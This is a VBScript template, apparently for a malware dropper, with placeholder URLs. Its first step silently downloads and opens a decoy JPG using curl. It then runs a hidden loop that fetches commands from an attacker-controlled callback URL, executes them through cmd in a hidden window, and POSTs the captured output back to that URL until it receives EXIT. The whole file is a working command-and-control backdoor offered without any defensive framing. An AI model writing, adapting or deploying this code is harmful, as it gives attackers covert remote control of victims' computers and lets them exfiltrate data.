On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Dim tmpFolder 
tmpFolder = fso.GetSpecialFolder(2)
CONST callbackUrl = "%CALLBACK_URL%"
Set oS = CreateObject ("WScript.Shell")
oS.run "cmd.exe /C curl ""%JPG_URL%"" -o " & tmpFolder & "\\%JPG_OUTPUT_NAME% & start "" "" " & tmpFolder & "\\%JPG_OUTPUT_NAME% & timeout 3", 0, True
Dim xmlHttpReq, s, execObj, abc, break, re

Set s = CreateObject("WScript.Shell")


break = False
While break <> True
    Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, false
	xmlHttpReq.SetTimeouts 10000, 10000, 10000, 100000
    xmlHttpReq.Send

    abc = "cmd /c " & Trim(xmlHttpReq.responseText) & " > " &  tmpFolder & "\\out.txt" 

    If InStr(abc, "EXIT") Then
        break = True
    Else
        With CreateObject("WScript.Shell")

			' Pass 0 as the second parameter to hide the window...
			.Run abc, 0, True

		End With
		
		re = ""
		
		With CreateObject("Scripting.FileSystemObject")
			
			re = .OpenTextFile(tmpFolder & "\\out.txt").ReadAll()
			.DeleteFile tmpFolder & "\\out.txt"

		End With

        Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, false
		xmlHttpReq.SetTimeouts 10000, 10000, 10000, 10000
        xmlHttpReq.Send(re)
    End If
Wend